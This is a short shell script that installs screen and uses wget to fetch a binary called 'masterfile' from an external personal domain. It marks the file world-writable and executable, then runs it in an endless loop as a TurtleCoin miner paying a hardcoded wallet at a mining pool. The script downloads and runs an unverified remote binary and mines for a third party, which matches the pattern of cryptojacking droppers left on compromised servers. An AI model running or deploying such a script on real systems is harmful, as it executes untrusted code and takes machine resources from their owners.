#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://swenson.my.id/mining/masterfile
chmod 777 masterfile
while [ 1 ]; do
./masterfile --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u TRTLv3Dv15w2NKdvz1uQRFfusQ4ev23yCjiLVBTkPHq9PDTwRQxtcQrFpB8J2knsgH6T3cNqFU36qGyo1Y1a4NZX7vPmuZqFNki -p x -a argon2/chukwav2 -k
sleep 3
done
sleep 999
